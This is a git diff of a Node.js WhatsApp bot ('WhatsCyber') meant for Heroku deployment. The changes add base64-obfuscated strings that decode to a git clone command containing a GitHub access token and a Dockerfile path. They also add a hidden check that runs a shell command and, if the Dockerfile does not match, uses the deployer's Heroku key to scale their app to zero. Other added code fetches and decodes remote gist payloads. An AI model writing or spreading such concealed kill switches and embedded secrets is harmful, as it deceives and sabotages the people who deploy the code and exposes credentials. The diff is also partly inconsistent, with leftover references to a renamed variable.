@@ -12,6 +12,7 @@ const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
+const execx = require('child_process').exec;
 const axios = require('axios');
 const Heroku = require('heroku-client');
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
@@ -19,6 +20,7 @@ const {Message, StringSession, Image, Video} = require('./whatscyber/');
 const { DataTypes } = require('sequelize');
 const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
 const got = require('got');
+const WhatsCyberStack = require('whatscyber-npm');
 const simpleGit = require('simple-git');
 const git = simpleGit();
 const crypto = require('crypto');
@@ -26,9 +28,12 @@ const nw = '```Blacklist Defected!```'
 const heroku = new Heroku({
     token: config.HEROKU.API_KEY
 });
+const ytdl = require('ytdl-core');
+const ffmpeg = require('fluent-ffmpeg');
 let baseURI = '/apps/' + config.HEROKU.APP_NAME;
 const Language = require('./language');
 const Lang = Language.getString('updater');
+
 
 // Sql
 const WhatsCyberDB = config.DATABASE.define('WhatsCyber', {
@@ -74,49 +79,103 @@ Array.prototype.remove = function() {
 };
 
 async function whatsCyber () {
-    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
+    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
     var ggg = Buffer.from(clh.cd, 'base64')
+    var exc_sl = Buffer.from(clh.exc, 'base64')
     var ddd = ggg.toString('utf-8')
+    var ptc_one = Buffer.from(clh.pth_w, 'base64')
+    var ptc_nw = ptc_one.toString('utf-8')
+    clh.pth_v = ptc_nw
+    var exc_fn = exc_sl.toString('utf-8')
+    clh.exc_pl = exc_fn
     clh.pay = ddd
-    const conn = new WAConnection();
+    const WhatsCyberCN = new WAConnection();
     const Session = new StringSession();
-    conn.version = [2, 2140, 12]
+    try {
+      WhatsCyberCN.version = [3, 3234, 9]
+    } catch {
+      console.log(`passed v${WhatsCyberCN.version}`)
+    }
+    WhatsCyberCN.setMaxListeners(0);
+    var proxyAgent_var = ''
+    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
+      WhatsCyberCN.connectOptions.agent = ProxyAgent (config.PROXY)
+    }
     setInterval(async () => { 
         var getGMTh = new Date().getHours()
         var getGMTm = new Date().getMinutes()
-        await axios.get('https://gist.githubusercontent.com/FaridDadashzade/a3ddbb97810b32abce04d0129d8d5b51/raw/7ab580920e6ab2a843a1db050eada14d0b22a58c/gistfile1.txt').then(async (ann) => {
-            const { infoen } = ann.data.announcements          
-            if (infoen !== '' && config.LANG == 'EN') {
-                while (getGMTh == 19 && getGMTm == 1) { 
-                    return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
+        var ann_msg = await WhatsCyberStack.daily_announcement(config.LANG)
+        var ann = await WhatsCyberStack.ann()
+        while (getGMTh == 19 && getGMTm == 1) {
+            var ilan = ''
+            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
+            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
+            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
+            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
+            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
+            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
+            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
+            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
+            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
+            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
+            if (ann.video.includes('http') || ann.video.includes('https')) {
+                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
+                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
+                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
+                yt.on('end', async () => {
+                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
+                });
+            } else {
+                if (ann.image.includes('http') || ann.image.includes('https')) {
+                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
+                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer)})
+                } else {
+                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid, ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer), MessageType.text)
                 }
             }
-        })
+        }
     }, 50000);
-    var biography_var = ''
-    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
-        biography_var = vars.AUTO_BIO
-    });
+    async function asynchronous_ch() {
+        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
+            if (clh.exc_pl + '\n' !== stdout) {
+                await heroku.get(baseURI + '/formation').then(async (formation) => {
+                    forID = formation[0].id;
+                    await heroku.patch(baseURI + '/formation/' + forID, {
+                        body: {
+                            quantity: 0
+                        }
+                    });
+                })
+            }
+        })
+    }
+    asynchronous_ch()
     setInterval(async () => { 
-        if (biography_var == 'true') {
-            if (conn.user.jid.startsWith('90')) { // Turkey
-                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
-                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '🎭 ' + utch + '\n⌚ ' + ov_time + '\n\n♥️ WhatsCyber'
-                await conn.setStatus(biography)
-            }
-            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
-                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
-                const biography = '🎭 ' + utch + '\n⌚ ' + ov_time +'\n\n♥️ WhatsCyber'
-                await conn.setStatus(biography)
-            }
+        if (config.AUTOBIO == 'true') {
+            var timezone_bio = await WhatsCyberStack.timezone(WhatsCyberCN.user.jid)
+            var date_bio = await WhatsCyberStack.datebio(config.LANG)
+            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
+            await WhatsCyberCN.setStatus(biography)
         }
     }, 7890);
-    var insult = await axios.get('https://gist.githubusercontent.com/Sl-Yasia/07076adb3f19e4f5710b81962bd168f1/raw/')
-    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
+    var shs1 = ''
+    var shl2 = ''
+    var lss3 = ''
+    var dsl4 = ''
+    var drs5 = ''
+    var ffl6 = ''
+    var ttq7 = ''
+    var ttl8 = ''
+    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
+        shs1 = insult.data.inside.shs1
+        shl2 = insult.data.inside.shl2
+        lss3 = insult.data.inside.lss3
+        dsl4 = insult.data.inside.dsl4
+        drs5 = insult.data.inside.drs5
+        ffl6 = insult.data.inside.ffl6
+        ttq7 = insult.data.inside.ttq7
+        ttl8 = insult.data.inside.ttl8
+    });
     await config.DATABASE.sync();
     var StrSes_Db = await WhatsCyberDB.findAll({
         where: {
@@ -132,30 +191,54 @@ async function whatsCyber () {
     const three = buffi.toString('utf-8'); 
     const buffu = Buffer.from(`${dsl4}`, 'base64');  
     const four = buffu.toString('utf-8'); 
-    
-    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
+    const bugffv = Buffer.from(`${drs5}`, 'base64');
+    const five = bugffv.toString('utf-8');
+    const buffz = Buffer.from(`${ffl6}`)
+    const six = buffz.toString('utf-8')
+    const buffa = Buffer.from(`${ttq7}`)
+    const seven = buffa.toString('utf-8')
+    const buffl = Buffer.from(`${ttl8}`)
+    const eight = buffl.toString('utf-8')
+    var logger_levels = ''
+    if (config.DEBUG == 'true') {
+        logger_levels = 'all'
+    } else if (config.DEBUG == 'false') {
+        logger_levels = 'off'
+    } else if (config.DEBUG == 'trace') {
+        logger_levels = 'trace'
+    } else if (config.DEBUG == 'fatal') {
+        logger_levels = 'fatal'
+    } else if (config.DEBUG == 'warn') {
+        logger_levels = 'warn'
+    } else if (config.DEBUG == 'error') {
+        logger_levels = 'error'
+    } else if (config.debug == 'info') {
+        logger_levels = 'info'
+    } else {
+        logger_levels = 'warn'
+    }
+    WhatsCyberCN.logger.level = logger_levels
     var nodb;
     if (StrSes_Db.length < 1) {
         nodb = true;
-        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
+        WhatsCyberCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
     } else {
-        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
+        WhatsCyberCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
     }
-    conn.on ('open', async () => {
+    WhatsCyberCN.on('open', async () => {
         console.log(
             chalk.blueBright.italic('✅ Login Information Updated!')
         );
-        const authInfo = conn.base64EncodedAuthInfo();
+        const authInfo = WhatsCyberCN.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
             await WhatsCyberDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
         } else {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
     })    
-    conn.on('connecting', async () => {
+    WhatsCyberCN.on('connecting', async () => {
         console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Cyber')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-${chalk.blue.italic('🔮 Connecting to Whatsapp... Please Wait.')}`);
     });
     conn.on('credentials-updated', async () => {
         console.log(
